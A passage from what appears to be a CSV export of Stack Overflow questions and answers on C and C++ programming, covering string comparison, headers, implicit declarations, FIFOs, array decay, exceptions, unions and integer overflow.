  <li>In C++, std::string has iterators, but these are based on char_type, not on code points. So if I do a ++ on an std::string::iterator, I get the next char_type, not the next code point. Similarly, if you call std::string::operator[], you get a reference to a char_type, which has the great potential to not be a complete code point. So how does one iterate an std::string by code point? (C has the _mbsinc() function).</li>
  </ol>
</blockquote>

<p>I think that <a href=""http://linux.die.net/man/3/mbrtowc"" rel=""nofollow""><code>mbrtowc(3)</code></a> would be the best option here for decoding a single code point of a multibyte string.</p>

<p>Overall, I think the best strategy for cross-platform Unicode compatibility is to do everything in UTF-8 internally using single-byte characters.  When you need to call a Windows API function, convert it to UTF-16 and always call the <code>*W</code> variant.  Most non-Windows platforms use UTF-8 already, so that makes using those a snap.</p>
"
"<p>I wrote this small piece of code in C to test <code>memcmp()</code> <code>strncmp()</code> <code>strcmp()</code> functions in C.</p>

<p>Here is the code that I wrote:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char** argv)
{
        char *word1=""apple"",*word2=""atoms"";

        if (strncmp(word1,word2,5)==0)
                printf(""strncmp result.\n"");
        if (memcmp(word1,word2,5)==0)
                printf(""memcmp result.\n"");
        if (strcmp(word1,word2)==0)
                printf(""strcmp result.\n"");
}
</code></pre>

<p>Can somebody explain me the differences because I am confused with these three functions?My main problem is that I have a file in which I tokenize its line of it,the problem is that when I tokenize the word ""atoms"" in the file I have to stop the process of tokenizing.I first tried <code>strcmp()</code> but unfortunately when it reached to the point where the word ""atoms"" were placed in the file it didn't stop and it continued,but when I used either the <code>memcmp()</code> or the <code>strncmp()</code> it stopped and I was happy.But then I thought,what if there will be a case in which there is one string in which the first 5 letters are a,t,o,m,s and these are being followed by other letters.Unfortunately,my thoughts were right as I tested it using the above code by initializing <code>word1</code> to ""atomsaaaaa"" and <code>word2</code> to atoms and <code>memcmp()</code> and <code>strncmp()</code> in the if statements returned 0.On the other hand <code>strcmp()</code> it didn't.It seems that I must use <code>strcmp()</code>.</p>

<p>I have done google searches but I got more confused as I have seen sites and other forums to define these three differently.If it is possible for someone to give me correct explanations/definitions so I can use them correctly in my source code,I would be really grateful.  </p>
","9530","","<p>In short:</p>

<ul>
<li><a href=""http://linux.die.net/man/3/strcmp""><code>strcmp</code></a> compares null-terminated C strings</li>
<li><a href=""http://linux.die.net/man/3/strcmp""><code>strncmp</code></a> compares at most N characters of null-terminated C strings</li>
<li><a href=""http://linux.die.net/man/3/memcmp""><code>memcmp</code></a> compares binary byte buffers of N bytes</li>
</ul>

<p>So, if you have these strings:</p>

<pre><code>const char s1[] = ""atoms\0\0\0\0"";  // extra null bytes at end
const char s2[] = ""atoms\0abc"";     // embedded null byte
const char s3[] = ""atomsaaa"";
</code></pre>

<p>Then these results hold true:</p>

<pre><code>strcmp(s1, s2) == 0      // strcmp stops at null terminator
strcmp(s1, s3) != 0      // Strings are different
strncmp(s1, s3, 5) == 0  // First 5 characters of strings are the same
memcmp(s1, s3, 5) == 0   // First 5 bytes are the same
strncmp(s1, s2, 8) == 0  // Strings are the same up through the null terminator
memcmp(s1, s2, 8) != 0   // First 8 bytes are different
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/245973/whats-the-best-c-json-parser"">What’s the best C++ JSON parser?</a>  </p>
</blockquote>



<p>I wish to access a HTTP url which returns a JSON object (which I need to parse). Which C++ library can I use for these two tasks?</p>

<hr>

<p>I meant to check if there is a library that does both these tasks? Or do I need to access the object first using libcurl or cpp-netlib, and then parse it?</p>
","9530","","<p>There are a number of C++ HTTP libraries.  I'd recommend <a href=""http://curl.haxx.se/libcurl/"" rel=""nofollow"">libcurl</a>.</p>
"
"<p>I'm trying to understand how to compile C++ programs from the command line using g++ and (eventually) Clang on Ubuntu.</p>

<p>I found a webpage which explains MakeFiles and I am following their directions. <a href=""http://mrbook.org/tutorials/make/"" rel=""nofollow"">http://mrbook.org/tutorials/make/</a></p>

<p>I downloaded the four example files into their own directory.</p>

<ul>
<li>main.cpp</li>
<li>hello.cpp</li>
<li>factorial.cpp</li>
<li>functions.h</li>
</ul>

<p>I then went ahead and ran their example of how to manually compile without a MakeFile.</p>

<pre><code>g++ main.cpp hello.cpp factorial.cpp -o hello
</code></pre>

<p>When I ran the command from above, I received the following error from g++:</p>

<pre><code>main.cpp:1:22: fatal error: iostream.h: No such file or directory
compilation terminated.
hello.cpp:1:22: fatal error: iostream.h: No such file or directory
compilation terminated.
</code></pre>

<p>My only experience with writing c++ is using an IDE such as VS C++ Express or CodeBlocks. Isn't the compiler supposed to know what iostream.h is and where to find it?</p>

<p>How do I get rid of this error so the program willl compile?</p>

<p>Thanks for any help. </p>
","9530","","<p>Before the C++ language was standardized by the ISO, the header file was named <code>&lt;iostream.h&gt;</code>, but when the C++98 standard was released, it was renamed to just <code>&lt;iostream&gt;</code> (without the <code>.h</code>).  Change the code to use <code>#include &lt;iostream&gt;</code> instead and it should compile.</p>

<p>You'll also need to add a <code>using namespace std;</code> statement to each source file (or prefix each reference to an iostream function/object with a <code>std::</code> specifier), since namespaces did not exist in the pre-standardized C++.  C++98 put the standard library functions and objects inside the <code>std</code> namespace.</p>
"
"<p>I have the following code:</p>

<pre><code>struct message_t *msg = ( struct message_t* ) malloc ( sizeof( struct message_t ) );
struct server_t *server = ( struct server_t* ) malloc ( sizeof( struct server_t ) );

server = network_connect( argv[ 2 ] );
</code></pre>

<p>The function network_connect return a struct server_t. However I contentiously get the error: </p>

<blockquote>
  <p>warning: assignment makes pointer from integer without a cast [enabled by default].</p>
</blockquote>

<p>I don't understand this error... first I didn't allocated memory to my pointer server_t. Well I get the error and try allocate memory and nothing. I review the code network_connect and all is right.</p>
","9530","","<p>My psychic powers tell me that you're missing the function prototype (declaration) for the <code>network_connect</code> function—make sure to include the header file that it's contained in.</p>

<p>In C, the compiler allows <em>implicit declarations</em>: when the compiler sees a new function name it's never seen before (such as <code>network_connect</code>), it assumes that it takes an arbitrary number and types of arguments and that it returns <code>int</code>.  So, due to the implicit function declaration, the compiler thinks you're trying to convert from an <code>int</code> to a <code>struct server_t*</code>, which results in the given warning.</p>

<p>You also have a memory leak in your code—you're allocating memory for the <code>server</code> object with <code>malloc</code>, and then you immediately overwrite that pointer with the value returned by <code>network_connect</code>, so that memory you allocated is gone forever.  There's no need to allocate any memory in this case, since <code>network_connect</code> directly returns its value.</p>

<p>Finally, in C, there's no need to cast the return value of <code>malloc</code>.  <code>malloc</code> returns a <code>void*</code>, and C (but not C++) allows an implicit cast from <code>void*</code> to any other pointer type.  A cast here is just unnecessary extra verbosity, and it can actually hide errors—if you forget to include <code>&lt;stdlib.h&gt;</code>, then any use of <code>malloc</code> will use an implicit declaration (see above) that returns <code>int</code>.  A cast will hide the error (that you forgot to include <code>&lt;stdlib.h&gt;</code>), whereas having no cast will give you a warning.</p>
"
"<p>I don't understand how this works. Say I have the following:</p>

<pre><code>void print(char* str, int len)
{
    int i = 0;
    for (i=0; i&lt;len; i++)
    {
        if (str[i]=='\0')
            printf("" "");
        else
            printf(""%c"", str[i]);
    }
    printf(""\n\n"");
}

char* sym4 = ""="";
char str2[strlen(var)+strlen(sym4)];

unsigned long temp1 = 0x00000008;
unsigned char* nTableSize = (unsigned char*)&amp;temp1;

memcpy(str2, var, strlen(var));
memcpy(str2+strlen(var), sym4, 1);
memcpy(str2+strlen(var)+1, nTableSize, 4);

print(str2, 5);
print(str2, 6);
</code></pre>

<p>and running it gives the output:</p>

<pre><code>var=
var
</code></pre>

<p>so evidently something is going wrong (plus it's messing the rest of my program up). Why isn't nTableSize being correctly copied to str2 in such a way that printing 5 characters results in a different output from 6?...</p>
","9530","","<p>Assuming you're on a little-endian architecture like x86 or x86-64, the 4-byte value 0x0000008 is represented in memory as the bytes <code>08 00 00 00</code>.  You're printing out the bytes as characters, and character 8 is ASCII for the backspace character <code>'\b'</code>.</p>

<p>When you print out a <code>\b</code> to the terminal, the terminal driver moves the cursor one character backwards, but it doesn't actually write anything out—it's not until you write the next character which causes it to overwrite the character that was previously there.</p>

<p>So, when you print out the 5 bytes <code>""var=\b""</code>, it prints out <code>""var=""</code> and leaves the cursor under the <code>=</code> sign.  But when you print out the 6 bytes <code>""var=\b ""</code>, it writes <code>""var=""</code>, moves the cursor back one, and overwrites the <code>=</code> with a space, leaving you with <code>""var ""</code>.</p>

<p>If you redirected the output to a file instead of printing to the terminal, you'd see the raw <code>08</code> byte being printed instead.</p>
"
"<p>Say I have a file dog.txt</p>

<pre><code>The quick brown fox jumps over the lazy dog.
</code></pre>

<p>I can read from the file like this</p>

<pre><code># include &lt;stdio.h&gt;
int main(){
  char str[10];
  FILE *fp;
  fp = fopen(""dog.txt"", ""r"");
  fscanf(fp, ""%[ABCDEFGHIJKLMNOPQRSTUVWXYZ]"", str);
  printf(""%s\n"", str);
  return 0;
}
</code></pre>

<p>and the program will output <code>T</code>. However instead of listing all the letters, can I utilize the POSIX Character Classes, something like <code>[:upper:]</code> ?</p>
","9530","","<p>No, there's no portable way to do it.  Some implementations allow you to use character ranges like <code>%[A-Z]</code>, but that's not guaranteed by the C standard.  C99 §7.19.6.2/12 says this about the <code>[</code> conversion specifier (emphasis added):</p>

<blockquote>
  <p>The conversion specifier includes all subsequent characters in the <code>format</code> string, up to and including the matching right bracket (<code>]</code>). The characters between the brackets (the <em>scanlist</em>) compose the scanset, unless the character after the left bracket is a circumflex (<code>^</code>), in which case the scanset contains all characters that do not appear in the scanlist between the circumflex and the right bracket. If the conversion specifier begins with <code>[]</code> or <code>[^]</code>, the right bracket character is in the scanlist and the next following right bracket character is the matching right bracket that ends the specification; otherwise the first following right bracket character is the one that ends the specification. <strong>If a <code>-</code> character is in the scanlist and is not the first, nor the second where the first character is a <code>^</code>, nor the last character, the behavior is implementation-defined.</strong></p>
</blockquote>

<p>The <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/scanf.html"" rel=""nofollow"">POSIX.1-2008 description</a> has almost identical wording (and even defers to the ISO C standard in case of accidental conflict), so there are no additional guarantees in this case when using a POSIX system.</p>
"
"<p>I have created a pipe in linux <code>mkfifo /tmp/myFIFO</code> now i have set the chmod to 777.. then i have a c application which reads the pipe and output what i wrote to the pipe.</p>

<p>When i do it this way in php and this works..</p>

<pre><code>$command = ""echo 'helloworld' &gt; myFIFO"";
$process = proc_open($command, $descriptor, $pipes, $cwd, $env);
</code></pre>

<p>but when i do it with fwrite e.g</p>

<pre><code>$out = fopen(""/tmp/myFIFO"",""w"");
fwrite($out,""hello"");
fclose($out);
</code></pre>

<p>It does not work at all. I'm not getting any output from my pipe in linux?..  Why is that fwrite is not working?.. thanks</p>
","9530","","<p>FIFOs have the strange behavior that when you first <code>open</code> them for writing (either directly with the <code>open(2)</code> system call or via any wrapper such as <code>fopen(3)</code>), the <code>open</code> call blocks until a reader also opens the same FIFO for reading.  When both ends have opened, the two calls are unblocked, and reading and writing can commence.</p>

<p>What you're probably seeing is that your program is never getting to the <code>fwrite</code> call (which should function normally) because the <code>fopen</code> call never returns, since no reader has opened the other end of the FIFO yet.  If you have another program open up the FIFO for reading, it should work.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/2528318/c-how-come-an-arrays-address-is-equal-to-its-value"">C: How come an array’s address is equal to its value?</a>  </p>
</blockquote>



<p>I test in GCC 4.4.1 and I find <code>&amp;a=a</code>. I can't understand it. I think <code>&amp;a</code> should be the address where stores the address of the array, it can't be the same. Could someone give me a good explanation? Thanks very much.</p>
","9530","","<p>An array is an object in memory.  It has an address and a size.  It's also true that in certain contexts, an array <em>decays</em> into a pointer to its first element.  So numerically, if both <code>a</code> and <code>&amp;a</code> are compared as pointer values, they compare as equal, since they both point to the same address in memory.  But they have different data types: <code>a</code> has type <code>int[4]</code> (""array 4 of <code>int</code>""), or <code>int*</code> (""pointer to <code>int</code>"") in  certain contexts, whereas <code>&amp;a</code> always has type <code>int (*)[4]</code> (""pointer to array 4 of <code>int</code>"").</p>

<pre><code> &amp;a points here
 |
 V
+------+------+------+------+
| a[0] | a[1] | a[2] | a[3] |  sizeof(a) == 16
+------+------+------+------+
 ^
 |
 &amp;a[0] also points here
 In certain contexts, 'a' means &amp;a[0]
</code></pre>

<p>Hence, <code>(void *)a == (void *)&amp;a</code>.</p>

<p>Also note that because <code>a</code> and <code>&amp;a</code> point to different data types (and in particular, the pointed-to types have different sizes), doing pointer arithmetic will yield different results.  <code>a+1</code> will point to <code>&amp;a[1]</code> (advances by one <code>int</code> value), whereas <code>&amp;a+1</code> will point to just past the end of the array at <code>&amp;a[4]</code>, since it advances by one ""array 4 of <code>int</code>"" unit:</p>

<pre><code>                       &amp;a+1 points here
                             |
                             V
+------+------+------+------+
| a[0] | a[1] | a[2] | a[3] |
+------+------+------+------+
        ^
        |
  a+1 points here
</code></pre>
"
"<p>The <a href=""http://en.cppreference.com/w/cpp/thread/condition_variable"">reference I'm using</a> explains the two in the following way:</p>

<ul>
<li><p><code>wait_for</code> ""blocks the current thread until the condition variable is woken up or after the specified timeout duration""</p></li>
<li><p><code>wait_until</code> ""blocks the current thread until the condition variable is woken up or until specified time point has been reached""</p></li>
</ul>

<p>What is the difference? Will <code>wait_until</code> spin so that the thread can continue exactly (more or less) when it is signaled, whereas <code>wait_for</code> just adds the thread back into scheduling at that point?</p>
","9530","","<p>The difference is in how the wait duration is represented: <code>wait_for</code> takes a relative time (""wait for up to 10 seconds""), whereas <code>wait_until</code> takes an absolute time (""wait until 12:00 on October 30, 2012"").</p>

<p>Compare the declarations of the time parameters:</p>

<pre><code>// wait_for:
const std::chrono::duration&lt;Rep, Period&gt;&amp; rel_time

// wait_until:
const std::chrono::time_point&lt;Clock, Duration&gt;&amp; abs_time
</code></pre>
"
"<p>In the event of an unhandled C++ exception I want to print:</p>

<ol>
<li>The message (<code>what()</code>) of the C++ exception</li>
<li>A stack trace.</li>
</ol>

<p>In order to get the stack trace, I'm using <code>SetUnhandledExceptionFilter</code> in combination with the <a href=""http://www.codeproject.com/Articles/11132/Walking-the-callstack"">StackWalker</a> library:</p>

<pre><code>struct FooStackWalker : StackWalker
{
    virtual void OnCallstackEntry(CallstackEntryType, CallstackEntry &amp;entry) override
    {
        std::cerr &lt;&lt; entry.lineFileName &lt;&lt; "" ("" &lt;&lt; entry.lineNumber &lt;&lt; ""): "" &lt;&lt; entry.undFullName &lt;&lt; std::endl;
    }
};

LONG WINAPI UnhandledExceptionHandler(LPEXCEPTION_POINTERS pointers)
{
    FooStackWalker walker;
    walker.ShowCallstack(::GetCurrentThread(), pointers-&gt;ContextRecord);
    ::TerminateProcess(::GetCurrentProcess(), 1);
}


int main()
{
    ::SetUnhandledExceptionFilter(UnhandledExceptionHandler);
}
</code></pre>

<p>I've gotten the stack trace to print just fine, but now getting <code>what</code> is difficult.</p>

<p>Is there some way I can decode the SEH exception as a C++ exception in order to call this member function before termination?</p>
","9530","","<p><strong>Edit</strong>: I misunderstood your question.  I can't say for certain what the answer is for C++ exceptions, but I'm reasonably sure that the answer is ""no"".  I don't believe there's any way to distinguish between unhandled exceptions caused by SEH (e.g. access violations) and uncaught C++ exceptions, or any way to distinguish between different types of C++ exceptions.  The horse has already left the barn on that one.</p>

<p>Original answer below:</p>

<hr>

<p>No, because an SEH exception doesn't have a <code>what</code>.  It's not a <code>std::exception</code>.  <a href=""http://msdn.microsoft.com/en-us/library/de5awhsw%28v=vs.100%29.aspx"" rel=""nofollow"">This MSDN example</a> says that when you're trying to catch an SEH exception as a C++ exception, it can only be caught with the ellipsis (<code>...</code>) <code>catch</code> handler.  You can use <a href=""http://msdn.microsoft.com/en-us/library/5z4bw5h5%28v=vs.100%29.aspx"" rel=""nofollow""><code>_set_se_translator</code></a> to define your own function which converts SEH exceptions into C++ exceptions, but at that point you're just generating your own <code>what</code> from the same information at a different place (and even then, I don't know if it'd be possible to get at it from the <code>UnhandledExceptionFilter</code>).</p>

<p>You have all of the information you need in the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa363082%28v=vs.85%29.aspx"" rel=""nofollow""><code>LPEXCEPTION_POINTERS</code> structure</a>.  If an access violation occurred, then <code>pointers-&gt;ExceptionRecord-&gt;ExceptionCode</code> will be <code>EXCEPTION_ACCESS_VIOLATION</code> (0xC0000005).  If that happened, then you can examine the <code>NumberParameters</code> and <code>ExceptionInformation</code> variables to figure out if it was a read or write violation and the address that was attempted to be accessed.</p>
"
"<p>I am trying to code a game of Blackjack. I have been self-learning C++ in my spare time, and this is my first time posting on any website about programming.</p>

<p>I have been looking up the answers to my problems as I go along, and have learned quite a lot.. but this problem has completely baffled me. I fear that I am approaching the task completely wrong, and hopefully you can help me with this.</p>

<p>I have a Card class, and a Deck class that holds a vector of 52 Cards. The vector is a private member of Deck class, and I fear this is my problem? </p>

<p>When I add the random_shuffle line to my code, it compiles fine but then the console window crashes (Windows 7 x64, code::blocks, c++). I can't work out what I am doing wrong. I call the vector random access iterators begin() and end()...</p>

<p><strong>deck.h</strong></p>

<pre><code>#ifndef DECK_H
#define DECK_H

#include &lt;vector&gt;

using namespace std;

/** Card Class */
class Card
{
public:
/** Constructor prototypes */
//Card(); //default constructor
Card(int s, int r) : suit(s), rank(r) {} 

/** GET function prototypes */
int getRank(); // returns card number as int
string getSuit(); // returns the suit in a string

private:
int rank;
int suit;
} ;

/** Deck class */
class Deck
{
public:
Deck();
vector &lt;Card&gt; get_deck() { return deck; };

private:
vector&lt;Card&gt; deck;
};

#endif // DECK_H
</code></pre>

<p><strong>deck.cpp</strong></p>

<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;vector&gt;
#include ""deck.h""

using namespace std;

/** Deck ctor to initialise deck */
Deck::Deck()
{
for(int suit = 0; suit &lt; 4; suit++)
{
    for(int rank = 0; rank &lt; 13; rank++)
    {
        deck.push_back(Card(suit,rank));
    }
}

}

/** Functions to GET rank and suit */
// Function to get rank as int
int Card::getRank()
{
return rank;
}

// Function to get suit as string
string Card::getSuit()
{
switch(suit)
{
    case 0:
    return ""Diamonds"";

    case 1:
    return ""Hearts"";

    case 2:
    return ""Clubs"";

    case 3:
    return ""Spades"";

    default:
    return ""Error"";
}
}
</code></pre>

<p><strong>main.cpp</strong></p>

<pre><code>#include &lt;iostream&gt;
#include &lt;algorithm&gt;
#include &lt;ctime&gt; // time()
#include &lt;string&gt;
#include &lt;vector&gt;

#include ""deck.h""

using namespace std;

int main()
{

Deck mydeck;

random_shuffle( mydeck.get_deck().begin(), mydeck.get_deck().end() );

// Loop to iterate through deck of cards
for(int i = 0; i&lt;52; i++)
{
    cout &lt;&lt; mydeck.get_deck()[i].getRank() &lt;&lt; "" of "" &lt;&lt; mydeck.get_deck()[i].getSuit() &lt;&lt; endl;
}

// Display size of deck
//cout &lt;&lt; endl &lt;&lt; ""The size of deck is: "" &lt;&lt; mydeck.get_deck().size() &lt;&lt; endl;


return 0;
}
</code></pre>

<p>Any help or words of wisdom will be much appreciated, and I hope I formatted everything right...</p>

<p>Many Thanks</p>

<p>Dan</p>
","9530","","<p>This accessor method:</p>

<pre><code>vector &lt;Card&gt; get_deck() { return deck; };
</code></pre>

<p>Returns a <em>copy</em> of the vector of cards.  So when you call it twice, you get two different copies, and the <code>begin()</code> of the first copy doesn't match up with the <code>end()</code> of the second copy, so it crashes.</p>

<p>To fix it, you should return the array <em>by reference</em> so that a copy is not made:</p>

<pre><code>vector &lt;Card&gt;&amp; get_deck() { return deck; }  // no semicolon needed here
//           ^
//           |
//    this is a reference
</code></pre>

<p>However, this allows the caller to modify the internal array, which is generally a bad idea.  To avoid this, you should return it by <code>const</code> reference:</p>

<pre><code>const vector &lt;Card&gt;&amp; get_deck() { return deck; }
</code></pre>

<p>But if you do that, then <code>std::random_shuffle</code> can't modify the array.  So to fix that, the ideal solution would be to add a class method to the <code>Deck</code> class which calls <code>random_shuffle</code> on itself.</p>
"
"<p>I was wondering if it was possible to configure visual studio 2008 debugger to stop execution when a thread exits with a precise error code (or at least any non-zero value). My app use a tremendous number of threads, so it's impossible to track them all manually. </p>

<p>Is there a way to tell VS2008 to break when ANY thread in the program hits ""exit(X);"" (X being different from 0) and display source ?</p>
","9530","","<p>Yes, set a breakpoint in the function <code>_RtlExitUserThread@4</code>, and add a condition of <code>*(int*)(ESP+4) == 42</code> to test if the exit status is a particular value (42, in this example); for 64-bit programs, use <code>ESP+8</code> instead of <code>ESP+4</code>.</p>

<p>However, if the thread exited by returning from its main thread procedure (the usual case) instead of directly calling <code>ExitThread</code> or one of its wrappers, then you won't have any information about what thread it was or what caused it to exit other than the exit status and the thread ID.</p>

<p>Note: The function name <code>_RtlExitUserThread@4</code> is an implementation detail that might change in future versions of Windows; <code>_RtlExitUserThread@4</code> is the name on Windows 7.  To find out what the actual is on your system, run <code>dumpbin /exports C:\Windows\system32\kernel32.dll</code> and look for the name that <code>ExitThread</code> maps to.</p>
"
"<p>Is it possible to declare a structure type that is only visible in the .c file which uses the structure? I know that by putting <strong>static</strong> in front of a external data object, you change the linkage of the variable to be internal. But is it possible to put <strong>static</strong> in front of the declaration of a new <strong>struct</strong> type, like the following?</p>

<pre><code>static struct log{
            ...;
            ...;
};
typedef struct log log;
</code></pre>

<p>If it is not possible to make the structure type, say <strong>log</strong> as above, to be ""private"", does it mean that even though other source files do not know the existence of the name (which is <strong>log</strong> in my example) of the structure, accidental name collisions can still happen if they name some variables <strong>log</strong> (assuming I will link all object files) ?</p>

<p><strong>EDIT</strong>: I am not familiar with how compiler/linker works. If there is a global variable name <strong>log</strong>, and the file that contains the global variable is linked to the sole source file in which structure <strong>log</strong> is defined, wouldn't that cause any confusion when linking, one <strong>log</strong> is a variable name while another <strong>log</strong> is a type name?</p>
","9530","","<p>No.  The only way to make a <code>struct</code> private is to only have its definition available in the files that use it -- don't put it in a common header file.  If it's only used in one source file, then just define it in that source file, but if it's used in more than one source file, you have a tricky problem: you can define it in each source file, but that's fragile since you have to remember to change each instance of it when you make any changes; or, you can define it in a private header file, and make sure only those source files include the private header.</p>

<p>Name collisions in different source files are ok, as long as they don't try to interface with each other in any way.  If you have a <code>struct log</code> defined in one file and a different definition of <code>struct log</code> in a different file, do not ever pass one <code>log</code> to the other.  In C, the structure name doesn't become part of any symbol names in the object file -- in particular, there's no name mangling of function names to include the parameter types (like C++ does), since function overloading is illegal in C.</p>
"
"<p>I'm trying to get my head around usual arithmetic conversions and tried to test:  </p>

<pre><code>(static_cast&lt;unsigned char&gt;(std::numeric_limits&lt;unsigned char&gt;::max()) &gt; static_cast&lt;signed char&gt;(-1))
</code></pre>

<p>this evaluates to true, which is ok, but according to Arithmetic conversion it should result in false (last bullet):  </p>

<blockquote>
  <blockquote>
    <p>Integral promotions are performed on the operands as follows:</p>
  </blockquote>
  
  <p>If either operand is of type unsigned long, the other operand is
  converted to type unsigned long.</p>
  
  <p>If preceding condition not met, and if either operand is of type long
  and the other of type unsigned int, both operands are converted to
  type unsigned long.</p>
  
  <p>If the preceding two conditions are not met, and if either operand is
  of type long, the other operand is converted to type long.</p>
  
  <p>If the preceding three conditions are not met, and if either operand
  is of type unsigned int, the other operand is converted to type
  unsigned int.</p>
  
  <p>If none of the preceding conditions are met, both operands are
  converted to type int.</p>
</blockquote>

<p>The last bullet says that if none of the other conditions are met both operands will be convered to type int. Following this unsigned char(max_char) will have bit pattern filled with ones only and signed char(-1) will have bit patterns filled with ones only. This would mean 1 > 1 == false, yet I'm getting the true. Any thoughts?</p>
","9530","","<p>You're right that the last bullet is the one that is used, so both operands are converted to type <code>int</code>.  The left-hand side is <code>(unsigned char)255</code>, and the right-hand side is <code>(signed char)-1</code>.  Since both 255 and -1 are representable as an <code>int</code>, they get converted into <code>(int)255</code> and <code>(int)-1</code> respectively, and since 255 is greater than -1, it returns <code>true</code>.</p>
"
"<p>Can I declare and initialize struct separately?</p>

<pre><code>Ref refType(string strRef) {
    Ref ref;
    if (regex_match(strRef.begin(), strRef.end(), rxIdentifier)) {
        ref = { Var, strRef };
    } else if (regex_match(strRef.begin(), strRef.end(), rxConstant)) {
        ref = { Const, strRef };
    }
    return ref;
}
</code></pre>

<p>Doesn't appear to work. Visual Studio complains about the <code>{</code> for initializing the struct. </p>
","9530","","<p>Yes, but only in C99 and C++11.  Older versions of C and C++ do not support anything like this.</p>

<p>In C99, they're called <em>compound literals</em>, and they look like this:</p>

<pre><code>typedef struct Point
{
    int x, y;
} Point;
...
Point p;
p = (Point){3, 4};
</code></pre>

<p>In C++11, they're called <em>extended initializer lists</em>, and they look like this:</p>

<pre><code>struct Point
{
    int x, y;
};
...
Point p;
p = {3, 4};
</code></pre>

<p>However, as Evgeny Panasyuk pointed out, Visual Studio is not yet fully compliant with the C++11 standard.  Visual Studio 2010 was released before the C++11 standard was finalized, and even then it wasn't fully compliant with the draft standard at the time.  Apparently VS2012 hasn't quite caught up yet, either.</p>

<p>As a result, Visual Studio does not yet support extended initializer lists.  Visual Studio also does not support C99, and Microsoft has indicated that they do not intend to support C99 any time soon.</p>
"
"<p>Can I have a union like this</p>

<pre><code>  union eight_floats_t
  {
    __m256 a;
    __m128 b[2];
  };
  eight_floats_t eight_floats;
</code></pre>

<p>to have an instant access to the two 128 bit parts of a 256 bit register?</p>

<p>Edit: I was asking to understand the performance impact of this approach.</p>
","9530","","<p>Yes, you can.  Have you tried it?</p>

<p>Do be aware that the C standard says that it's unspecified behavior to access a member of a union which was not the one most recently written to -- specifically, if you write to one member and then read a different one, the other one has unspecified values (C99 §6.2.6.1/7).  However, it is an extremely common idiom and is well-supported by all major compilers. As a practical matter, reading and writing to any member of a union, in any order, is acceptable practice (<a href=""http://cellperformance.beyond3d.com/articles/2006/06/understanding-strict-aliasing.html"" rel=""nofollow"">source</a>).</p>
"
"<p>I am compiling a C program on Solaris 10 for x86, this is a part linked:</p>

<pre><code>&gt;yyerrlab1:/*Suppress GCC warning that yyerrlab1 is unused when no action*/
&gt;#if defined (__GNUC_MINOR__)&amp;&amp;2093&lt;=(__GNUC__*1000+__GNUC_MINOR__) 
&gt; __attribute__((__unused__))
&gt;#endif
&gt;goto yyerrlab2;
</code></pre>

<p>The code is written in a file named yacc.y.
When I compile the program by makefile, the result comes out to be:</p>

<pre><code>&gt;bison -d -p syn yacc.y
&gt;yacc.y:conflicts:7shifts/reduce
&gt;mv yacc.tab.h yacc.h
&gt;mv yacc.tab.c yacc.c
&gt;yacc.tab.c: in function 'int synparse()';
&gt;yacc.tab.c:1543:error:expected primary-expression before ""__attribute__""
&gt;yacc.tab.c:1543:error:expected "";"" before ""__attribute__""
</code></pre>

<p>What's wrong with the code?And how can I fix it?</p>
","9530","","<p>The code is using a GCC-specific language extension called <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#Function-Attributes"" rel=""nofollow"">attributes</a> to indicate that the label might be unused.  Ordinarily, GCC emits a warning for an unused label, since it can be indicative of a bug, but in this case since the code is autogenerated by YACC, it's not sure if it's used or not.  So, this attribute suppresses the warning in case it's not used.</p>

<p>It appears that the compiler you're using doesn't support the <code>__attribute__</code> syntax.  The <code>#if</code> test is supposed to protect against that, but apparently the test failed, either because you're using some odd variant of GCC that doesn't support it, or you're using a different compiler that's pretending to be GCC.</p>

<p>To fix it, either switch to a modern GCC version if possible, or modify the <code>#if</code> test to be false with your compiler.  The quick and dirty fix would be to just remove the <code>#if</code> completely, since the <code>__attribute__</code> tag isn't necessary for correctness, it's just there to remove a potential compiler warning.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/204476/what-should-main-return-in-c-c"">What should main() return in C/C++?</a>  </p>
</blockquote>



<pre><code>#include&lt;stdio.h&gt;
int main()
{
    return 0;
}
</code></pre>

<p>In the code snippet given above, where does the return 0 returned by main go? Or in other words which function called the main function in the beginning.</p>
","9530","","<p><code>main</code> is called by some startup function in the C runtime library.  The C language standard says that returning from <code>main</code> is equivalent to calling the <a href=""http://linux.die.net/man/3/exit""><code>exit</code></a> function, so most C runtimes look something like this:</p>

<pre><code>void _start(void)  /* Exact function signature may vary */
{
    /* Platform-specifi startup (e.g. fetch argc and argv from the OS) */
    ...
    int status = main(argc, argv);
    exit(status);
    /* Never reached */
}
</code></pre>

<p>The exit status gets passed back to the operating system, and then what happens from there is OS-dependent.</p>

<p>When you compile and link your program, the executable file format (e.g. PE or ELF) contains a start address, which is the virtual address at which execution begins.  That function is typically part of the C runtime library (like the example <code>_start</code> above).  That function has to end by calling a system call such as <code>exit</code>, since if it just returned, it would have nowhere to go to: it would just pop an address off the stack and jump to that location, which would be garbage.</p>

<p>Depending on how the OS loader initializes processes, the program arguments <code>argc</code>, <code>argv</code>, and other data (such as the environment) might either come in as function parameters (either through registers or the stack), or they might require system calls (e.g. <code>GetCommandLine</code> on Windows) to retrieve them.  But dealing with all of that is the job of the C runtime, and unless you're explicitly going out of your way to avoid using the C runtime, you needn't worry about those details.</p>
"
"<p>that's my code: </p>

<pre><code>long base2(int number)
{
   long result = 0;
   int num = number;
   int multi = 1;
   int rem;
   while(num &gt; 0)
   {
    rem = num % 2;
    result = result + (rem * multi);
    num = num / 2;
    multi = multi * 10;
   }
   return result;
}
</code></pre>

<p>I'm getting a weird print: <code>-1884801888</code></p>

<p>I ran the debugger and its calculating properly but just at the end the final answer changes to this <code>-1884801888</code></p>

<p>[The printing happens in the main, I checked, the number changes here to <code>-1884801888</code>]</p>

<p>Thank you!</p>
","9530","","<p>On most common platforms nowadays, both <code>int</code> and <code>long</code> are 32 bits wide.  You are causing an <em>integer overflow</em>, where the values you're computing exceed the range representable in signed 32-bit integers.</p>

